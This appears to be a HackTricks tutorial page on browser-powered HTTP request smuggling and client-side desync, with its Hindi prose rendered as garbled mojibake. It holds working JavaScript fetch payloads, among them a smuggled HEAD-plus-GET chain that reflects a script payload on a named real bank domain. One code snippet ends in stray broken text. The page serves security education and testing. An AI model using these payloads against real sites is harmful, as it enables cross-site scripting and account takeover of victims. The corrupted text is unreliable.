# Browser HTTP Request Smuggling

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
## CL.0/H2.0 browser-compatible desync

рдпрд╣ рднреЗрджреНрдпрддрд╛ рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм **Content Length** (CL) рд╣реЗрдбрд░ рдХреЛ **backend server** рджреНрд╡рд╛рд░рд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдЕрдирджреЗрдЦрд╛** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдмреИрдХ-рдПрдВрдб **body** рдХреЛ рджреВрд╕рд░реЗ рдЕрдиреБрд░реЛрдз рдХреЗ **method рдХреА рд╢реБрд░реБрдЖрдд** рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирддрд╛ рд╣реИред CL рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рдЗрд╕реЗ 0 рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирдиреЗ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ CL.0 desync рд╣реИ - рдПрдХ [рдЬреНрдЮрд╛рдд](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) рд▓реЗрдХрд┐рди рдХрдо рдЕрдиреНрд╡реЗрд╖рд┐рдд рд╣рдорд▓реЗ рдХреА рд╢реНрд░реЗрдгреАред

![](<../../.gitbook/assets/image (3) (1) (2).png>)

рд╣рдорд▓рд╛ рд╕рдВрднрд╡ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдмрд╕ **POST рдЕрдиреБрд░реЛрдз рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рдерд╛**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рднреЗрджреНрдпрддрд╛ рдПрдХ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рд╡реИрдз**, рд╡рд┐рдирд┐рд░реНрджреЗрд╢-рдЕрдиреБрд░реВрдк **HTTP рдЕрдиреБрд░реЛрдз** рджреНрд╡рд╛рд░рд╛ **рдЯреНрд░рд┐рдЧрд░** рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **front-end рдХреЗ рдкрд╛рд╕ рдЗрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рдореМрдХрд╛ рдирд╣реАрдВ рд╣реИ**, рдФрд░ рдпрд╣ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рднреА рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

**CL.0** рдФрд░ **H2.0** рдХреЗ рдмреАрдЪ рдХрд╛ рдПрдХрдорд╛рддреНрд░ **рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рджреВрд╕рд░рд╛ **HTTP2** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ (рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдирд┐рд╣рд┐рдд content-length рд╣реЗрдбрд░ рд╣реИ) рд▓реЗрдХрд┐рди **backend рдЙрд╕рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ**ред

## Client-Side Desync

рдкрд╛рд░рдВрдкрд░рд┐рдХ desync рд╣рдорд▓реЗ **рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЬрд╣рд░реАрд▓рд╛** рдмрдирд╛рддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐ **front-end рдФрд░ back-end** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП рд╡реЗ рдЙрди рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рдЕрд╕рдВрднрд╡ рд╣реИрдВ рдЬреЛ front-end/back-end рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдЕрдм рд╕реЗ **server-side desync** рд╣реИрдВред рдЕрдзрд┐рдХрд╛рдВрд╢ **server-side desyncs** рдХреЗрд╡рд▓ рдПрдХ **рдХрд╕реНрдЯрдо HTTP рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рдПрдХ рджреЛрд╖рдкреВрд░реНрдг рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдХреЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред**

рдПрдХ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ desync рдХрд╛ рдХрд╛рд░рдг рдмрдирдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рдПрдХ рдирдИ рдзрдордХреА рдХреА рд╢реНрд░реЗрдгреА рдХреЛ рд╕рдХреНрд╖рдо рдмрдирд╛рддреА рд╣реИ рдЬрд┐рд╕реЗ **client-side desync** (CSD) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред\
CSD рд╣рдорд▓рд╛ рдЗрд╕рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ **рдкреАрдбрд╝рд┐рдд рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ**, рдЬреЛ рдлрд┐рд░ рдЙрдирдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ **рджреЛ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рднреЗрджреНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рд╣реЛрддреЗ рд╣реИрдВ**ред **рдкрд╣рд▓рд╛** рдЕрдиреБрд░реЛрдз рдЗрд╕ рддрд░рд╣ рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ desync рдХрд░ рджреЗ** рдФрд░ **рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз** рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рджреЗрддрд╛ рд╣реИред

### Detect

CSD рд╡реЗрдХреНрдЯрд░ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рджреЛ** **рдореБрдЦреНрдп** рдЧреБрдг рд╣реЛрддреЗ рд╣реИрдВред

рдкрд╣рд▓рд╛, **рд╕рд░реНрд╡рд░ рдХреЛ рдЕрдиреБрд░реЛрдз рдХреЗ Content-Length (CL)** рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреБрд░реЛрдз рдиреЗ рдпрд╛ рддреЛ **рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛**, рдпрд╛ рд╕рд░реНрд╡рд░ рдмрд╕ **рдЪреБрдиреЗ рдЧрдП рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ POST рдЕрдиреБрд░реЛрдз рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рдерд╛**ред **рд╕реНрдерд┐рд░ рдлрд╛рдЗрд▓реЛрдВ** рдФрд░ **рд╕рд░реНрд╡рд░-рд╕реНрддрд░реАрдп рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕** рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рдФрд░ **рдЕрддреНрдпрдзрд┐рдХ-рд▓рдВрдмреЗ-URLs** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдФрд░ **рдЕрд░реНрдз-рджреЛрд╖рдкреВрд░реНрдг** рд╡рд╛рд▓реЗ рдЬреИрд╕реЗ /%2e%2e рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВред

рджреВрд╕рд░рд╛, рдЕрдиреБрд░реЛрдз рдХреЛ **рд╡реЗрдм-рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдореЗрдВ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рдХрд╛рдлреА рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реЗрдбрд░реНрд╕ рдкрд░ рд╕реАрдорд┐рдд рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ рдмреЙрдбреА рд╣реИ рддреЛ рдЖрдкрдХреЛ HTTP POST рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЕрдВрддрддрдГ рдЖрдк рдХреЗрд╡рд▓ **URL** рдкрд░ рд╣реА **рдирд┐рдпрдВрддреНрд░рдг** рд░рдЦрддреЗ рд╣реИрдВ, рдкреНрд▓рд╕ рдХреБрдЫ рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдЬреИрд╕реЗ рдХрд┐ **Referer рд╣реЗрдбрд░**, **рдмреЙрдбреА**, рдФрд░ **Content-Type рдХрд╛ рдмрд╛рдж рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ред**

#### CL ignore testing

рдЗрд╕ рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧ рдХреЛ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ **рджреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдФрд░ рдмреАрдЪ рдореЗрдВ рдПрдХ рдХреЛ smuggle рдХрд░реЗрдВ**ред рдпрджрд┐ **smuggled** рдХрдиреЗрдХреНрд╢рди рдиреЗ **рджреВрд╕рд░реЗ** **рдЕрдиреБрд░реЛрдз** рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛**, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ **рднреЗрджреНрдп** рд╣реИ:

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХреЗрд╡рд▓ рднреЗрдЬреЗ рдЧрдП рдПрдХ рд╕реЗ **рдмрдбрд╝реЗ Content-Length** рдХреЛ рднреЗрдЬрдХрд░ рдФрд░ **рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреА рддрд▓рд╛рд╢ рдореЗрдВ** рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рд╕рд░реНрд╡рд░ **рдкреВрд░реА рдмреЙрдбреА рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░ рднреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддреЗ рд╣реИрдВ**ред
{% endhint %}

рдпрд╣ рдЬрд╛рдирдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдХреНрдпрд╛ **рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ HTTP**/2 рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИред CSD рд╣рдорд▓реЗ рдЖрдорддреМрд░ рдкрд░ HTTP/1.1 рдХрдиреЗрдХреНрд╢рди рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм **рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ HTTP/2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдкрд╕рдВрдж рдХрд░рддреЗ рд╣реИрдВ** рдЬрдм рднреА рд╕рдВрднрд╡ рд╣реЛ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд▓рдХреНрд╖реНрдп **рд╡реЗрдмрд╕рд╛рдЗрдЯ HTTP/2 рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИ рддреЛ рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрдо рд╣реИ**ред рдПрдХ **рдЕрдкрд╡рд╛рдж** рд╣реИ; рдХреБрдЫ **forward proxies HTTP/2 рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ** рд╣реИрдВ рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдореЗрдВ рдХреЙрд░реНрдкреЛрд░реЗрдЯ рдкреНрд░реЙрдХреНрд╕реА, рдХреБрдЫ рдШреБрд╕рдкреИрдареА VPN рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрдХрд░рдг рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

### Confirm

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ рд╕рд╛рдЗрдЯ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рд╕реЗ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░рдирд╛ рд╣реИред рдЗрд╕ рд╕рд╛рдЗрдЯ рдХреЛ **HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП** рдФрд░ рдпрд╣ **рд▓рдХреНрд╖реНрдп рдбреЛрдореЗрди рд╕реЗ рдЕрд▓рдЧ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред

рдЕрдЧрд▓рд╛, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдиреЗ рдХреЛрдИ рдкреНрд░реЙрдХреНрд╕реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХреА рд╣реИ, рдлрд┐рд░ рдЕрдкрдиреА рд╣рдорд▓рд╛ рд╕рд╛рдЗрдЯ рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВред **рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕** рдЦ
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
### рд╢реЛрд╖рдг - рд╕реНрдЯреЛрд░

рдПрдХ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реИ рдХрд┐ рд▓рдХреНрд╖реНрдп рд╕рд╛рдЗрдЯ рдкрд░ рдРрд╕реА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдХреЛ **рдкрд╛рда рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░** рдХрд░рдиреЗ рджреЗрддреА рд╣реИ, рдФрд░ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рддреИрдпрд╛рд░ рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдХреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рдХреБрдХреАрдЬрд╝, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реЗрдбрд░реНрд╕, рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб **рдХрд╣реАрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛ рдЬрд╛рдПрдВ рдЬрд╣рд╛рдВ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВ**ред рдпрд╣ рд╣рдорд▓рд╛ рдкреНрд░рд╡рд╛рд╣ [рд▓рдЧрднрдЧ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рд╢реЛрд╖рдг рдХреЗ рд╕рдорд╛рди рд╣реА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), рдЗрд╕рд▓рд┐рдП рдореИрдВ рдЗрд╕ рдкрд░ рдЕрдзрд┐рдХ рдзреНрдпрд╛рди рдирд╣реАрдВ рджреВрдВрдЧрд╛ред

### рд╢реЛрд╖рдг - **рдЪреЗрди\&рдкрд┐рд╡рдЯ**

рд╕рд╛рдорд╛рдиреНрдп рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ, рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреЗ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╣рдорд▓реЗ** рдХреЗрд╡рд▓ рдЙрд╕ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╢реБрд░реВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреА рд╕реАрдзреА рдкрд╣реБрдВрдЪ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рднреЗрдЬрдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ **HTTP рд╣реЗрдбрд░реНрд╕ рдореЗрдВ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝** - рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ, рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рд╢реЛрд╖рдг, рд╣реЛрд╕реНрдЯ-рд╣реЗрдбрд░ рд╣рдорд▓реЗ, рдпреВрдЬрд╝рд░-рдПрдЬреЗрдВрдЯ рдЖрдзрд╛рд░рд┐рдд [SQLi](https://portswigger.net/web-security/sql-injection), CSRF JSON Content-type рдФрд░ рдЕрдиреНрдп рдХрдИред

рд╕рдлрд▓ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд╕рд░рд▓ рдорд╛рд░реНрдЧ рджреЛ рдореБрдЦреНрдп рддрдХрдиреАрдХреЛрдВ рд╕реЗ рдЖрдпрд╛ рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдбрд┐рд╕рд┐рдВрдХ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ: [**рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрд╕рд╛рдзрди рд╡рд┐рд╖рд╛рдХреНрддрддрд╛ рд╣реЛрд╕реНрдЯ-рд╣реЗрдбрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), рдФрд░ [**HEAD рдореЗрдердб**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ HTML рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЬреЛрдбрд╝рдирд╛ред рджреЛрдиреЛрдВ рддрдХрдиреАрдХреЛрдВ рдХреЛ **рдЕрдиреБрдХреВрд▓рд┐рдд** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рддрд╛рдХрд┐ рдХреБрдЫ рдирдИ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░** рдореЗрдВ рд╕рдВрдЪрд╛рд▓рди рд╕реЗ рдЬреБрдбрд╝реА рд╣реБрдИ рдереАрдВред

## рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг

### рд╕реНрдЯреИрдХреНрдб HEAD рдЙрджрд╛рд╣рд░рдг

* **рд░рдВрдЧреАрди рд╢реЛрд╖рдг**

![](<../../.gitbook/assets/image (2) (3).png>)

* **JS рд╢реЛрд╖рдг**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
рд╡реНрдпрд╛рдЦреНрдпрд╛:

* **CL.0 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** /assets рдореЗрдВ (рдпрд╣ /assets/ рдХреА рдУрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ CL рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛)
* **HEAD** рдЕрдиреБрд░реЛрдз рдХреЛ **Smuggle** рдХрд░реЗрдВ (рдХреНрдпреЛрдВрдХрд┐ HEAD рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдЕрднреА рднреА рдПрдХ content-length рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИрдВ)
* **GET** рдЕрдиреБрд░реЛрдз рдХреЛ **Smuggle** рдХрд░реЗрдВ рдЬрд┐рд╕рдХрд╛ **рд╕рд╛рдордЧреНрд░реА** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд** рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред
* HEAD рдЕрдиреБрд░реЛрдз рдХреЗ **content-length** рдХреЗ рдХрд╛рд░рдг, рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреА **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** HEAD рдЕрдиреБрд░реЛрдз рдХреЗ **рд╢рд░реАрд░** рд╣реЛрдЧреА
